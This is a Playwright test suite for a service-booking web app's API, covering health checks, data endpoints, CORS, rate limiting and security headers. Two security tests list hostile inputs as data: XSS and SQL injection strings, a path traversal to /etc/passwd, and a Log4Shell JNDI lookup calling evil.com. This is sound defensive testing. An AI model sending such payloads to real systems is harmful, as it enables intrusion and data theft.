import { test, expect } from '@playwright/test';

test.describe('API Tests', () => {
  const baseURL = process.env.PLAYWRIGHT_TEST_BASE_URL || 'http://localhost:3000';

  test('should respond to health check', async ({ request }) => {
    const response = await request.get(`${baseURL}/api/health`);
    
    expect(response.status()).toBe(200);
    
    const responseBody = await response.json();
    expect(responseBody).toHaveProperty('status');
    expect(responseBody.status).toBe('ok');
  });

  test('should handle homepage stats API', async ({ request }) => {
    const response = await request.get(`${baseURL}/api/homepage-stats`);
    
    expect(response.status()).toBe(200);
    
    const stats = await response.json();
    
    // Validate response structure
    expect(stats).toHaveProperty('totalProviders');
    expect(stats).toHaveProperty('activeBookings');
    expect(stats).toHaveProperty('completedJobs');
    expect(stats).toHaveProperty('averageRating');
    
    // Validate data types
    expect(typeof stats.totalProviders).toBe('number');
    expect(typeof stats.activeBookings).toBe('number');
    expect(typeof stats.completedJobs).toBe('number');
    expect(typeof stats.averageRating).toBe('number');
    
    // Validate reasonable ranges
    expect(stats.totalProviders).toBeGreaterThanOrEqual(0);
    expect(stats.activeBookings).toBeGreaterThanOrEqual(0);
    expect(stats.completedJobs).toBeGreaterThanOrEqual(0);
    expect(stats.averageRating).toBeGreaterThanOrEqual(0);
    expect(stats.averageRating).toBeLessThanOrEqual(5);
  });

  test('should handle categories API', async ({ request }) => {
    const response = await request.get(`${baseURL}/api/categories`);
    
    expect(response.status()).toBe(200);
    
    const categories = await response.json();
    
    // Should return an array
    expect(Array.isArray(categories)).toBeTruthy();
    
    if (categories.length > 0) {
      const category = categories[0];
      
      // Validate category structure
      expect(category).toHaveProperty('id');
      expect(category).toHaveProperty('name');
      expect(category).toHaveProperty('slug');
      
      // Validate data types
      expect(typeof category.name).toBe('string');
      expect(typeof category.slug).toBe('string');
      expect(category.name.length).toBeGreaterThan(0);
      expect(category.slug.length).toBeGreaterThan(0);
    }
  });

  test('should handle popular categories API', async ({ request }) => {
    const response = await request.get(`${baseURL}/api/popular-categories`);
    
    expect(response.status()).toBe(200);
    
    const popularCategories = await response.json();
    
    expect(Array.isArray(popularCategories)).toBeTruthy();
    
    if (popularCategories.length > 0) {
      const category = popularCategories[0];
      
      expect(category).toHaveProperty('name');
      expect(category).toHaveProperty('count');
      expect(typeof category.name).toBe('string');
      expect(typeof category.count).toBe('number');
      expect(category.count).toBeGreaterThan(0);
    }
  });

  test('should handle providers API', async ({ request }) => {
    const response = await request.get(`${baseURL}/api/providers`);
    
    expect(response.status()).toBe(200);
    
    const providers = await response.json();
    
    expect(Array.isArray(providers)).toBeTruthy();
    
    if (providers.length > 0) {
      const provider = providers[0];
      
      // Validate provider structure
      expect(provider).toHaveProperty('id');
      expect(provider).toHaveProperty('name');
      expect(provider).toHaveProperty('category');
      
      // Validate required fields
      expect(typeof provider.name).toBe('string');
      expect(provider.name.length).toBeGreaterThan(0);
    }
  });

  test('should handle search functionality', async ({ request }) => {
    const searchQuery = 'plumber';
    const response = await request.get(`${baseURL}/api/search/semantic?q=${encodeURIComponent(searchQuery)}`);
    
    // Should not return server error
    expect(response.status()).not.toBe(500);
    
    // If implemented, should return 200
    if (response.status() === 200) {
      const searchResults = await response.json();
      expect(Array.isArray(searchResults)).toBeTruthy();
    }
  });

  test('should handle error responses gracefully', async ({ request }) => {
    // Test invalid endpoint
    const response = await request.get(`${baseURL}/api/nonexistent-endpoint`);
    
    expect(response.status()).toBe(404);
    
    const errorResponse = await response.json();
    expect(errorResponse).toHaveProperty('error');
  });

  test('should handle CORS properly', async ({ request }) => {
    const response = await request.get(`${baseURL}/api/health`, {
      headers: {
        'Origin': 'https://example.com'
      }
    });
    
    // Should handle CORS headers
    const corsHeader = response.headers()['access-control-allow-origin'];
    
    // Either should allow origin or not set CORS headers
    expect(corsHeader === undefined || corsHeader === '*' || corsHeader.length > 0).toBeTruthy();
  });

  test('should validate request methods', async ({ request }) => {
    // Test POST on GET-only endpoint
    const response = await request.post(`${baseURL}/api/homepage-stats`);
    
    // Should reject POST if not allowed
    expect([405, 404].includes(response.status())).toBeTruthy();
  });

  test('should handle rate limiting gracefully', async ({ request }) => {
    // Make multiple rapid requests
    const requests = Array.from({ length: 10 }, () => 
      request.get(`${baseURL}/api/health`)
    );
    
    const responses = await Promise.all(requests);
    
    // Most requests should succeed
    const successfulRequests = responses.filter(r => r.status() === 200);
    expect(successfulRequests.length).toBeGreaterThan(5);
    
    // If rate limiting is implemented, some might return 429
    const rateLimitedRequests = responses.filter(r => r.status() === 429);
    
    if (rateLimitedRequests.length > 0) {
      // Rate limited responses should have proper headers
      const rateLimitResponse = rateLimitedRequests[0];
      const retryAfter = rateLimitResponse.headers()['retry-after'];
      
      // Should provide retry-after header
      expect(retryAfter).toBeTruthy();
    }
  });

  test('should handle content types correctly', async ({ request }) => {
    const response = await request.get(`${baseURL}/api/homepage-stats`);
    
    const contentType = response.headers()['content-type'];
    expect(contentType).toContain('application/json');
  });

  test('should handle query parameters', async ({ request }) => {
    // Test API with query parameters
    const response = await request.get(`${baseURL}/api/providers?category=plumbing&limit=5`);
    
    // Should handle query parameters gracefully
    expect([200, 400, 404].includes(response.status())).toBeTruthy();
    
    if (response.status() === 200) {
      const providers = await response.json();
      
      if (Array.isArray(providers)) {
        // Should respect limit parameter
        expect(providers.length).toBeLessThanOrEqual(5);
      }
    }
  });

  test('should validate input sanitization', async ({ request }) => {
    // Test with potentially malicious input
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      'DROP TABLE users;',
      '../../etc/passwd',
      '${jndi:ldap://evil.com/a}'
    ];
    
    for (const input of maliciousInputs) {
      const response = await request.get(`${baseURL}/api/search/semantic?q=${encodeURIComponent(input)}`);
      
      // Should not return server error from malicious input
      expect(response.status()).not.toBe(500);
      
      if (response.status() === 200) {
        const responseText = await response.text();
        
        // Response should not contain unescaped malicious input
        expect(responseText).not.toContain('<script>');
        expect(responseText).not.toContain('DROP TABLE');
      }
    }
  });

  test('should handle concurrent requests', async ({ request }) => {
    // Test concurrent requests to same endpoint
    const concurrentRequests = Array.from({ length: 5 }, () => 
      request.get(`${baseURL}/api/homepage-stats`)
    );
    
    const startTime = Date.now();
    const responses = await Promise.all(concurrentRequests);
    const endTime = Date.now();
    
    // All requests should succeed
    responses.forEach(response => {
      expect(response.status()).toBe(200);
    });
    
    // Should handle concurrent requests efficiently
    const totalTime = endTime - startTime;
    expect(totalTime).toBeLessThan(5000); // Should complete within 5 seconds
  });

  test('should provide consistent response format', async ({ request }) => {
    // Test multiple endpoints for consistent formatting
    const endpoints = [
      '/api/homepage-stats',
      '/api/categories',
      '/api/popular-categories'
    ];
    
    for (const endpoint of endpoints) {
      const response = await request.get(`${baseURL}${endpoint}`);
      
      if (response.status() === 200) {
        const data = await response.json();
        
        // Should be valid JSON
        expect(data).toBeDefined();
        
        // Should not have null responses for successful requests
        expect(data).not.toBeNull();
      }
    }
  });

  test('should handle large responses', async ({ request }) => {
    // Test endpoints that might return large datasets
    const response = await request.get(`${baseURL}/api/providers`);
    
    if (response.status() === 200) {
      const data = await response.json();
      
      if (Array.isArray(data) && data.length > 100) {
        // Large responses should be handled efficiently
        const contentLength = response.headers()['content-length'];
        
        if (contentLength) {
          const size = parseInt(contentLength);
          
          // Should use compression for large responses
          const contentEncoding = response.headers()['content-encoding'];
          
          if (size > 10000) { // 10KB
            expect(contentEncoding).toBeTruthy();
          }
        }
      }
    }
  });

  test('should handle API versioning', async ({ request }) => {
    // Test API versioning if implemented
    const versionedEndpoint = `${baseURL}/api/v1/health`;
    const response = await request.get(versionedEndpoint);
    
    // Should either work or return proper 404
    expect([200, 404].includes(response.status())).toBeTruthy();
    
    if (response.status() === 200) {
      const data = await response.json();
      expect(data).toHaveProperty('status');
    }
  });
});

test.describe('API Security', () => {
  const baseURL = process.env.PLAYWRIGHT_TEST_BASE_URL || 'http://localhost:3000';

  test('should have proper security headers', async ({ request }) => {
    const response = await request.get(`${baseURL}/api/health`);
    
    const headers = response.headers();
    
    // Check for security headers
    expect(headers['x-content-type-options']).toBeTruthy();
    expect(headers['x-frame-options']).toBeTruthy();
    
    // Should not expose sensitive information
    expect(headers['server']).not.toContain('Express');
    expect(headers['x-powered-by']).toBeFalsy();
  });

  test('should validate authentication on protected endpoints', async ({ request }) => {
    // Test protected endpoints without authentication
    const protectedEndpoints = [
      '/api/admin/users',
      '/api/user/profile',
      '/api/provider/dashboard'
    ];
    
    for (const endpoint of protectedEndpoints) {
      const response = await request.get(`${baseURL}${endpoint}`);
      
      // Should require authentication
      expect([401, 403, 404].includes(response.status())).toBeTruthy();
    }
  });

  test('should prevent injection attacks', async ({ request }) => {
    // Test SQL injection patterns
    const injectionPatterns = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' UNION SELECT * FROM users --"
    ];
    
    for (const pattern of injectionPatterns) {
      const response = await request.get(`${baseURL}/api/search/semantic?q=${encodeURIComponent(pattern)}`);
      
      // Should not cause server error
      expect(response.status()).not.toBe(500);
      
      if (response.status() === 200) {
        const responseText = await response.text();
        
        // Should not expose database errors
        expect(responseText.toLowerCase()).not.toContain('sql');
        expect(responseText.toLowerCase()).not.toContain('database');
        expect(responseText.toLowerCase()).not.toContain('table');
      }
    }
  });
});
